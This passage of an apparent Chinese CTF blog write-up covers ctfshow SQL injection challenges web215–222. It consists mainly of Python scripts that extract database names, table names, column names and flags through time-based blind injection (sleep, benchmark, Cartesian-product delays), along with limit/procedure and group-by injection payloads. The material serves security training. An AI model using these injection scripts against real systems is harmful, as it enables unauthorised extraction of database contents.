        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
        <span class="token comment"># 查库名</span>
        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>
        <span class="token comment"># 查表名  ctfshow_flagxc,ctfshow_info</span>
        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment"># 查列名  id,flagaa,info</span>
        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"</span>
        <span class="token comment"># getFlag</span>
        payload <span class="token operator">=</span> <span class="token string">"select flagaa from ctfshow_flagxc"</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1' or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1),1) and '1'='1"</span></span><span class="token punctuation">,</span>
            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
            tail <span class="token operator">=</span> mid
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
</code></pre>

<h4 id="web216-to-base64"><a href="#web216-to-base64" class="headerlink" title="web216(to_base64)"></a>web216(to_base64)</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select id from ctfshow_info where ip &#x3D; from_base64(127.0.0.1);</code></pre>

<p>将Payload进行base64编码并闭合即可</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"https://7d8b8dba-70c3-4c4e-8065-f936f72d0187.challenge.ctf.show/api/"</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>
    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
        <span class="token comment"># 查库名</span>
        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>
        <span class="token comment"># 查表名  ctfshow_flagxcc,ctfshow_info</span>
        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment"># 查列名  id,flagaac,info</span>
        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxcc'"</span>
        <span class="token comment"># getFlag</span>
        payload <span class="token operator">=</span> <span class="token string">"select flagaac from ctfshow_flagxcc"</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"'MQ==') or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1),1)#"</span></span><span class="token punctuation">,</span>
            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
            tail <span class="token operator">=</span> mid
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
</code></pre>

<h4 id="web217-benchmark"><a href="#web217-benchmark" class="headerlink" title="web217(benchmark)"></a>web217(benchmark)</h4><p><code>sleep</code>被ban了</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/c1e4r/articles/9060525.html">sql时间盲注另外两种方式(benchmark,heavy query)</a></p>
<p><strong>benchmark()</strong></p>
<p>benchmark是Mysql的一个内置函数,其作用是来测试一些函数的执行速度。benchmark()中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select BENCHMARK(10000,md5(&#39;a&#39;));
+---------------------------+
| BENCHMARK(10000,md5(&#39;a&#39;)) |
+---------------------------+
|                         0 |
+---------------------------+
1 row in set (0.00 sec)

mysql&gt; select BENCHMARK(1000000,md5(&#39;a&#39;));
+-----------------------------+
| BENCHMARK(1000000,md5(&#39;a&#39;)) |
+-----------------------------+
|                           0 |
+-----------------------------+
1 row in set (0.33 sec)

mysql&gt; select BENCHMARK(10000000,md5(&#39;a&#39;));
+------------------------------+
| BENCHMARK(10000000,md5(&#39;a&#39;)) |
+------------------------------+
|                            0 |
+------------------------------+
1 row in set (2.93 sec)</code></pre>

<p>可以看到,执行不同的次数那么执行的时间也就不一样，通过这个函数我们可以达到与sleep()同样的延时目的。</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">ip&#x3D;1) and if(2&gt;1,(select count(*) from((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,2)c)),1&amp;debug&#x3D;1</code></pre>



<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"https://92f2c52d-9e13-4d63-8711-5eea7dcd5ac4.challenge.ctf.show/api/"</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
i <span class="token operator">=</span> <span class="token number">30</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>
    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
        <span class="token comment"># 查库名</span>
        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>
        <span class="token comment"># 查表名  ctfshow_flagxccb,ctfshow_info</span>
        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment"># 查列名  id,flagaabc,info</span>
        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxccb'"</span>
        <span class="token comment"># getFlag</span>
        payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flagxccb"</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,benchmark(700000,md5(1)),1"</span></span><span class="token punctuation">,</span>
            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>
            tail <span class="token operator">=</span> mid
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
</code></pre>

<h4 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h4><p><code>benchmark</code>被ban了</p>
<p>还有一种方法 使用查询语句 查询大量数据从而消耗时间</p>
<p>本地先演示一次 users一共六条数据 最终会有36条数据 6*6&#x3D;36 form后 如果是逗号 会进行排列组合 如果表足够大那么查询的数据也就相</p>
<p>当大（原理不用理解 记住这么用能查询大量数据即可）该方式叫笛卡尔积</p>
<p><img src="web218.png" loading="lazy"></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"https://2ba8df77-69bf-43d4-99e0-b2689ef71af6.challenge.ctf.show/api/"</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
i <span class="token operator">=</span> <span class="token number">7</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>
    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
        <span class="token comment"># 查库名</span>
        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>
        <span class="token comment"># 查表名  ctfshow_flagxc,ctfshow_info</span>
        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment"># 查列名  id,flagaac,info</span>
        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"</span>
        <span class="token comment"># getFlag</span>
        payload <span class="token operator">=</span> <span class="token string">"select flagaac from ctfshow_flagxc"</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) and if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,(select count(*) from((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,2)c)),1"</span></span><span class="token punctuation">,</span>
            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
            tail <span class="token operator">=</span> mid
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
<span class="token comment"># ctfshow&#123;f470e6gb-3856-42D3-ae55-402e84412f0P&#125;</span>
<span class="token comment"># ctfshow&#123;f47hc6hb-3856-4293-ae55-402e84412f04&#125;</span>
<span class="token comment"># ctfshow&#123;f470c7dh-3856-4293-ae55-402e84412f04&#125;</span>
<span class="token comment"># ctfshow&#123;f470c6db-3856-4293-ae55-402e84412f04&#125; √</span>
</code></pre>

<h4 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h4><p>多屏蔽了一个rlike（也是延时的一种方法） 上一题脚本依旧可以</p>
<h4 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h4><p>过滤了substr 那就使用left即可 并且过滤了concat 导致我们group_concat 不 能使用 但是可以是用limit 逐行获取</p>
<p><strong>limit N,M</strong> : 相当于 <strong>limit M offset N</strong> , 从第 N 条记录开始, 返回 M 条记录</p>
<p>另外ascii也被ban了，所以直接比较字符串</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"https://83d3e450-cfe1-4e34-9769-2021e662fa03.challenge.ctf.show/api/"</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
flagdic <span class="token operator">=</span> <span class="token string">"1234567890-_&#123;&#125;qwertyuioplkjhgfdsazxcvbnm, "</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagdic<span class="token punctuation">:</span>
        <span class="token comment"># 查库名</span>
        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>
        <span class="token comment"># 查表名  ctfshow_flagxcac,ctfshow_info</span>
        <span class="token comment"># payload = "select table_name from information_schema.tables where table_schema=database() limit 0,1"</span>
        <span class="token comment"># 查列名  id,flagaabcc,info</span>
        <span class="token comment"># payload = "select column_name from information_schema.columns where table_name='ctfshow_flagxcac' limit 1,1"</span>
        <span class="token comment"># getFlag</span>
        payload <span class="token operator">=</span> <span class="token string">"select flagaabcc from ctfshow_flagxcac"</span>
        tmp <span class="token operator">=</span> flag <span class="token operator">+</span> j
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) and if(left((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">)='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">',(select count(*) from((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,2)c)),1"</span></span><span class="token punctuation">,</span>
            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">' '</span><span class="token punctuation">:</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre>

<h4 id="web221-limit注入"><a href="#web221-limit注入" class="headerlink" title="web221(limit注入)"></a>web221(limit注入)</h4><p>查询语句</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//分页查询</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user <span class="token function">limit</span> <span class="token punctuation">(</span><span class="token variable">$page</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token variable">$limit</span><span class="token punctuation">,</span><span class="token variable">$limit</span><span class="token punctuation">;</span>
    </code></pre>

<p>返回逻辑</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:很安全，不需要过滤</span>
<span class="token comment">//拿到数据库名字就算你赢</span>
      </code></pre>

<p>1）<strong>limit前面没有order by时，后面可以跟union，如果存在order by，则不能使用union。</strong></p>
<p>2）limit后面不能直接跟select语句和if语句。<strong>可以跟procedure语句，值得注意的是只有在5.0.0&lt; MySQL &lt;5.6.6版本才可以使用，procedure后面支持报错注入以及时间盲注</strong></p>
<p>3）limit 关键字后面还可跟PROCEDURE和 INTO两个关键字，但是 INTO 后面写入文件需要知道绝对路径以及写入shell的权限，因此利用比较难。</p>
<p><a target="_blank" rel="noopener" href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/procedure-analyse.html">PROCEDURE ANALYZE</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">Mysql下Limit注入方法</a></p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;api&#x2F;?page&#x3D;1&amp;limit&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)</code></pre>

<p><img src="web221.png" loading="lazy"></p>
<h4 id="web222-group注入"><a href="#web222-group注入" class="headerlink" title="web222(group注入)"></a>web222(group注入)</h4><p>查询语句</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//分页查询</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user group <span class="token class-name type-declaration">by</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    </code></pre>

<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html#1869274163">group by注入原理</a></p>
<p>延时盲注，例如</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">group by if(1&#x3D;1,sleep(1),1)</code></pre>

<blockquote>
<p>但要注意的是，group by会向下一直查询，数据库里总共有21条数据，如果我们是sleep(0.05)则是停顿1.05秒</p>
</blockquote>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"https://cfb15639-dd8d-4146-a2c1-5b6e2e349162.challenge.ctf.show/api/"</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>
    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
        <span class="token comment"># 查库名</span>
        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>
        <span class="token comment"># 查表名  ctfshow_flaga,ctfshow_user</span>
        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment"># 查列名  id,flagaabc,info</span>
        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga'"</span>
        <span class="token comment"># getFlag</span>
        payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flaga"</span>
        params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"u"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"concat((if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">, sleep(0.05), 2)),1);"</span></span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
            tail <span class="token operator">=</span> mid
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
</code></pre>

</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">I'm so cute. Please give me money.</div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Hsad</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://hsad.xyz/2024/07/05/EZsql/" title="EZsql">https://hsad.xyz/2024/07/05/EZsql/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2024/07/07/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="prev" title="信息收集"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">信息收集</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2024/07/02/EZupload/" rel="next" title="EZupload"><span class="post-nav-text">EZupload</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Hsad</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.2.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>